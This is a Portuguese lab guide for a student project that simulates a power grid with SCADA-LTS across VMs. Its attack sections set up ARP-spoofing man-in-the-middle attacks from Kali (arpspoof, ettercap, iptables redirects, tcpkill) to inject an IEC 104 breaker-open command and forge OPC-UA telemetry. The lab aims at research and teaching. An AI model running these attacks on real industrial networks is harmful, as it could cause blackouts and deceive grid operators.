# Guia: subir a simulação toda nas VMs (distribuída)

Passo a passo para colocar no ar o cenário completo do PFC com **uma entidade por VM**,
a cascata acontecendo **entre as máquinas**, o SCADA-LTS como HMI e os dois casos de ataque.
Este guia já vem com os **IPs e o ambiente reais** (VMware Workstation, rede NAT VMnet8,
`192.168.21.0/24`). Para a referência genérica da arquitetura, veja `docs/GUIA_VMS.md`.

Onde cada coisa roda:

| Papel | Máquina | IP | O que sobe | Config |
|-------|---------|----|-----------|--------|
| RTU hidro (usina OPC-UA, alvo Caso 2) | VM Ubuntu | 192.168.21.11 | server OPC-UA + plant_link + Modbus | `vm_hidro.yaml` |
| RTU térmica (usina IEC104, alvo Caso 1) | VM Ubuntu | 192.168.21.12 | slave IEC104 + plant_link + Modbus | `vm_termica.yaml` |
| RTU industrial (bairro IEC104) | VM Ubuntu | 192.168.21.13 | slave IEC104 + plant_link + Modbus | `vm_industrial.yaml` |
| RTU centro (bairro DNP3) | VM Ubuntu | 192.168.21.14 | outstation DNP3 + plant_link + Modbus | `vm_centro.yaml` |
| RTU hospital (bairro crítico DNP3) | VM Ubuntu | 192.168.21.15 | outstation DNP3 + plant_link + Modbus | `vm_hospital.yaml` |
| Coordenador (a física da rede) | **Host Windows** | 192.168.21.1 | `grid_model` + sync | `vm_coordenador.yaml` |
| Centro de controle (o operador) | **Host Windows** | 192.168.21.1 | masters IEC104/DNP3 + cliente OPC-UA | `vm_centro_controle.yaml` |
| SCADA-LTS (HMI) | **Host Windows** | 192.168.21.1 | MySQL + Tomcat | — |
| Atacante | VM **Kali_Desec** | 192.168.21.21 | `mitm.py` (IEC104/DNP3/OPC-UA) | — |

Três canais, não confundir: **sync :7070** (coordenador↔RTU, é o lado físico, não se ataca),
**protocolo** 2404/20000/4840 (RTU↔operador, é a rede SCADA onde o MITM entra) e **Modbus :5020**
(RTU↔SCADA-LTS, a HMI lendo cada RTU).

---

## 0. Pré-requisitos (uma vez)

1. **As 5 VMs Ubuntu ligadas** com os IPs fixados por reserva DHCP no VMnet8 (`.11` a `.15`).
   Confira com `ping 192.168.21.11` etc. a partir do host.
2. **Chave SSH sem passphrase** do host para as RTUs (usuário `pfc`): `ssh pfc@192.168.21.11`
   deve entrar sem pedir nada. O `deploy_vms.ps1` depende disso.
3. **Python no host** (para coordenador e centro de controle): `pip install -r requirements.txt`
   no diretório do projeto.
4. **Kali ligada** (`192.168.21.21`, usuário `ldpkali`) só quando for rodar os ataques.

---

## 1. Distribuir o código nas RTUs (host Windows, PowerShell)

O script `deploy_vms.ps1` copia o projeto, cria o venv, instala as dependências e garante swap
em cada RTU. Rode do diretório do projeto:

```bash
cd C:\LUCIANO\IME\5.1\PFC\PFC_Pinheiro_Rabelo
.\deploy\deploy_vms.ps1 deploy
```

Faça de novo sempre que mudar o código do simulador. Só a VM-hidro recebe o `asyncua` (OPC-UA);
as demais rodam só com `pyyaml`.

> Os IPs já estão nos configs (`vm_*.yaml`), no `DIST_HOSTS` do gerador de emport e no
> `deploy_vms.ps1`. Só mexa neles se trocar o endereçamento das VMs.

---

## 2. Subir os 5 RTUs

```bash
.\deploy\deploy_vms.ps1 start
```

Isso inicia a simulação em cada RTU em background (via `~/sim.pid`). Confira:

```bash
.\deploy\deploy_vms.ps1 status
```

Cada RTU deve logar `PlantLink (RTU) ouvindo em 0.0.0.0:7070`. Se um RTU não aparecer, veja a
seção 8.

> O `start` usa `nohup` e **não** sobrevive a um reboot da VM. Se reiniciar uma VM, rode
> `start` de novo.

---

## 3. Subir o coordenador (host Windows)

É dele que você controla a demonstração. Deixe o terminal em foco:

```bash
cd C:\LUCIANO\IME\5.1\PFC\PFC_Pinheiro_Rabelo
python main.py -c config/vm_coordenador.yaml
```

Ele loga `PlantLink (coord): conectado ao RTU ...` para cada uma das 5 VMs. No prompt
`coordenador>`, digite `status` para ver a frequência (~60 Hz), as 2 usinas ligadas e os 3
bairros energizados.

---

## 4. Subir o centro de controle (host Windows)

Em outro terminal, o operador que pola os RTUs:

```bash
cd C:\LUCIANO\IME\5.1\PFC\PFC_Pinheiro_Rabelo
python main.py -c config/vm_centro_controle.yaml
```

Ele não emite comandos legítimos (os `command_ioas`/`command_indexes` estão vazios de
propósito), só leitura. Assim, qualquer comando que apareça depois é o ataque.

---

## 5. Subir o SCADA-LTS (host Windows) e importar a HMI

### 5.1 Subir os serviços
Na ordem, cada um na sua janela (deixe abertas):

```bash
C:\LUCIANO\IME\5.1\PFC\SCADA_LTS\start_mysql.bat
```

```bash
C:\LUCIANO\IME\5.1\PFC\SCADA_LTS\start_scadalts.bat
```

Espere de 30 s a 1 min e abra **http://localhost:8080/Scada-LTS** (login `admin`/`admin`).

### 5.2 Importar a view distribuída
A view com os 5 data sources (um por RTU) já está pronta em
`scadalts/cidade_emport_distribuido.json` (fundo: `scadalts/cidade_bg.png`). Os
data sources vêm com os IPs dos RTUs do cenário padrão; se os seus IPs forem
outros, ajuste o host de cada data source na UI depois de importar.

No SCADA-LTS:
1. Vá em **Emport** (`emport.shtm`), cole o conteúdo de `cidade_emport_distribuido.json` e
   importe. Cria os 5 data sources Modbus (um por IP de RTU), os data points e a graphical view.
2. Em **Graphical Views → Cidade - Rede Eletrica → Edit**, envie `cidade_bg.png` como imagem de
   fundo e salve. O SCADA-LTS não aceita SVG de fundo, por isso o PNG.
3. Habilite os data sources (ícone de play) e confirme que os pontos ficam verdes.

> A rede das VMs é mais lenta que localhost. O emport distribuído já usa timeout 1500 ms /
> retries 3 / contiguousBatches. Se pontos "piscarem" (apagando/ligando sozinhos), é timeout de
> leitura Modbus, não a física: aumente o update period do data source para 2 s na UI, e confira no
> console do coordenador se **não** há log de UFLS durante o pisca (confirma que é lado-leitura).

---

## 6. Validar sem ataque

- No coordenador (`status`): frequência ~60 Hz, hidro e térmica ligadas, os 3 bairros energizados.
- No SCADA-LTS: tudo verde, frequência 60 Hz, valores atualizando.

Faça antes um ensaio da cascata sem atacante, pelo próprio coordenador:

```
trip termica
```

A UFLS corta industrial e centro, sobra o hospital, e a frequência recupera. Para voltar:

```
restore
```

---

## 7. Caso 1 — cascata por MITM on-path (IEC 104, na Kali)

O alvo é a conexão IEC 104 entre o **master da térmica** (o `op-termica`, que roda no centro de
controle no host, `192.168.21.1`) e o **RTU da térmica** (`192.168.21.12`). Há duas formas de se
pôr no meio. A primeira é o ataque completo e é a que deve ir para o trabalho.

Antes de tudo, copie o projeto para a Kali (uma vez):

```bash
scp -r C:\LUCIANO\IME\5.1\PFC\PFC_Pinheiro_Rabelo ldpkali@192.168.21.21:~/
```

### 7.1 Ataque completo: on-path transparente por ARP spoofing (recomendado)

Aqui **ninguém reconfigura nada**. O atacante envenena o ARP das duas vítimas para o tráfego
passar por ele, uma regra `iptables REDIRECT` entrega as conexões ao proxy local, e o proxy
descobre o destino real (`.12:2404`) via `SO_ORIGINAL_DST`. É o ataque on-path de verdade. Só
funciona em Linux (a Kali), que é onde o atacante está.

Descubra o nome da interface da Kali no VMnet8 (normalmente `eth0`):

```bash
ip -br a            # procure a interface com IP 192.168.21.21
```

Tudo a seguir é na Kali, como root (`sudo -i` ou `sudo` em cada linha). Use **terminais
separados** para os dois `arpspoof` e para o proxy, porque eles ficam em primeiro plano.

**1) Habilite o encaminhamento e redirecione o tráfego IEC 104 para o proxy local:**

```bash
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404
```

**2) Envenene o ARP dos dois lados (um `arpspoof` por sentido, cada um no seu terminal):**

```bash
arpspoof -i eth0 -t 192.168.21.1  192.168.21.12     # diz ao master que .12 sou eu
```

```bash
arpspoof -i eth0 -t 192.168.21.12 192.168.21.1      # diz ao RTU que o master sou eu
```

**3) Suba o proxy transparente (outro terminal):**

```bash
cd ~/PFC_Pinheiro_Rabelo
python3 mitm.py --proto iec104 --transparent
```

**4) Force a conexão a renascer pelo atacante.** Se o master já estava conectado ao RTU antes do
envenenamento, a sessão TCP antiga não passa pelo proxy. No host, reinicie o centro de controle
(config **normal**, `vm_centro_controle.yaml`, sem apontar para o atacante) para ele reabrir a
conexão com `.12`, que agora é desviada para a Kali. No log do `mitm.py` deve aparecer a conexão
sendo interceptada e o destino original `192.168.21.12:2404`.

**5) Injete a abertura do disjuntor da usina, no console do `mitm.py`:**

```
s command 100 off
```

O comando chega ao RTU da térmica, vai ao coordenador, a física derruba a geração, a frequência
cai, e a UFLS corta industrial e depois centro, deixando só o hospital. Visível no SCADA-LTS e no
`status` do coordenador.

**Desfazer (na ordem):**

```bash
# Ctrl+C nos dois arpspoof (ao sair eles restauram o ARP das vitimas) e no mitm.py
iptables -t nat -D PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404
sysctl -w net.ipv4.ip_forward=0
```

E no console do coordenador: `restore`.

> Pré-requisitos: as duas vítimas e a Kali estão no mesmo segmento L2 (VMnet8), então o ARP
> spoofing alcança tanto o host quanto o RTU. `arpspoof` (pacote dsniff) e `iptables` já estão na
> imagem Kali. Para a captura do Wireshark do ataque, grave o link `.1 ↔ .12` na porta 2404.

### 7.2 Variante simples: proxy por redirecionamento (plano B, sem ARP)

Serve para ensaiar a injeção sem montar o ARP spoofing. Aqui o master é **reconfigurado** para
falar com o atacante, então não é on-path de verdade.

Na Kali, suba o proxy escutando e repassando para o RTU real:

```bash
cd ~/PFC_Pinheiro_Rabelo
python3 mitm.py --proto iec104 --listen-host 0.0.0.0 --down-host 192.168.21.12 --down-port 2404
```

No host, no `vm_centro_controle.yaml`, troque no `op-termica` o `host: 192.168.21.12` por
`host: 192.168.21.21` (o atacante) e suba o centro de controle.

```bash
python main.py -c config/vm_centro_controle.yaml
```

No console do `mitm.py`, `s command 100 off`. **Reset:** `restore` no coordenador e desfaça a
edição do `host` do `op-termica`.

---

## 8. Caso 2 — falsificação de telemetria (OPC-UA, na Kali)

O proxy OPC-UA entra entre o cliente (centro de controle) e a VM-hidro real. Igual ao Caso 1,
é **transparente**: a vítima **não é reconfigurada nem reiniciada** — o ARP spoofing + iptables
desviam o cliente e ele reconecta sozinho pelo proxy. Precisa de `asyncua`, que não vem na Kali,
então use venv.

1. **Na Kali**, prepare o venv (uma vez):

```bash
cd ~/PFC_Pinheiro_Rabelo
python3 -m venv venv && ./venv/bin/pip install asyncua
```

2. **Ponha-se on-path** (como no Caso 1, mas na porta 4840 e envenenando `.1 ↔ .11`):

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 4840 -j REDIRECT --to-port 4840
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.21.1// /192.168.21.11//
```

3. Suba o proxy transparente (escuta em `0.0.0.0:4840`, upstream para a hidro real `.11`):

```bash
./venv/bin/python mitm.py --proto opcua --transparent
```

4. **Force a reconexão** do cliente OPC-UA (ele reconecta sozinho pelo proxy — o centro de
   controle segue com o config **normal** `vm_centro_controle.yaml`, sem reiniciar):

```bash
sudo timeout 3 tcpkill -i eth0 host 192.168.21.11 and tcp port 4840
```

5. **No console do proxy**: `nodes` lista os pontos; `check Potencia_MW` compara o valor real com
   o entregue à vítima; `spoof Potencia_MW 999.0` (ou `spoof Frequencia_Hz 60.0`) forja a leitura.
   O operador vê o valor forjado, enquanto o SCADA-LTS, que lê a hidro por outro caminho (Modbus),
   mostra a realidade. São as duas telas do roteiro.

> **Posturas de segurança (os 3 casos):** o servidor da hidro roda em `NoSecurity`. A comparação
> do efeito das posturas (sem segurança, cifrado sem validar o certificado, e cifrado validando)
> é feita no laboratório autocontido `./venv/bin/python mitm.py --proto opcua --lab`
> (`secure none` / `secure trustall` / `secure validate`), que não envolve as VMs da cidade.

---

## 9. Encerrar

- Ataques: `Ctrl+C` no console do `mitm.py` na Kali (e `q` no ettercap, que restaura o ARP).
- Centro de controle e coordenador: `Ctrl+C` nos terminais do host (o console pode não sair no
  `quit`; use `Ctrl+C`).
- RTUs: no host, `.\deploy\deploy_vms.ps1 stop`.
- SCADA-LTS: feche a janela do Tomcat e, por último, a do MySQL.

---

## 10. Problemas comuns

- **RTU não sobe / não aparece no coordenador:** rode `.\deploy\deploy_vms.ps1 status`. Confira
  ping à VM, se o firewall liberou as portas (`7070` sempre, mais a do protocolo e `5020`) e se a
  VM não reiniciou (o `start` não persiste reboot).
- **OPC-UA (hidro) não conecta:** o `host:` no `vm_hidro.yaml` precisa ser o IP real da VM
  (`192.168.21.11`), porque o OPC-UA anuncia esse endpoint. Não use `0.0.0.0`.
- **SCADA-LTS não atualiza um bairro / pontos vermelhos:** verifique o data source daquele IP
  (porta 5020) e o firewall do RTU.
- **Pontos piscando no SCADA-LTS:** é timeout de leitura Modbus na rede das VMs, não a física
  (ver nota da seção 5.2). Suba o update period para 2 s e reimporte; considere subir a RAM da VM.
- **Login do SCADA-LTS dá 500:** falta `log_bin_trust_function_creators=1` no `mysql\my.ini`
  (ERROR 1418). Já está configurado; se reaparecer após recriar o banco, confirme a linha e
  reinicie o Tomcat.
- **Valores Modbus errados após mudar pontos no YAML:** os endereços se reordenam. Regenere o
  emport (`--distribuido`) e reimporte; confira o `MAPA DE REGISTRADORES` no log de cada RTU.

---

## Resumo (TL;DR)

```bash
REM no host, uma vez por mudanca de codigo
.\deploy\deploy_vms.ps1 deploy

REM sobe os 5 RTUs
.\deploy\deploy_vms.ps1 start

REM coordenador (console de controle) e centro de controle, cada um num terminal
python main.py -c config/vm_coordenador.yaml
python main.py -c config/vm_centro_controle.yaml

REM SCADA-LTS (host): MySQL, depois Tomcat, http://localhost:8080/Scada-LTS admin/admin
C:\LUCIANO\IME\5.1\PFC\SCADA_LTS\start_mysql.bat
C:\LUCIANO\IME\5.1\PFC\SCADA_LTS\start_scadalts.bat
```

Ataques na Kali (como root):
- **Caso 1 completo (ARP spoofing):** `sysctl -w net.ipv4.ip_forward=1` + `iptables -t nat -A
  PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404` + dois `arpspoof -i eth0` (entre
  `192.168.21.1` e `192.168.21.12`) + `python3 mitm.py --proto iec104 --transparent`; reinicie o
  centro de controle com o `vm_centro_controle.yaml` **normal** (ninguém reconfigura a vítima) e
  injete `s command 100 off`.
- **Caso 2 (transparente):** on-path na porta 4840 (`ip_forward` + `iptables REDIRECT --dport 4840`
  + `ettercap` entre `.1` e `.11`) + `./venv/bin/python mitm.py --proto opcua --transparent`;
  `tcpkill` para forçar a reconexão (centro de controle com o `vm_centro_controle.yaml` **normal**)
  e `spoof Potencia_MW 999.0` no console. Lab dos 3 casos: `mitm.py --proto opcua --lab`.

Reset: `restore` no coordenador (e, no Caso 1, derrube os `arpspoof` e remova a regra de
`iptables`).
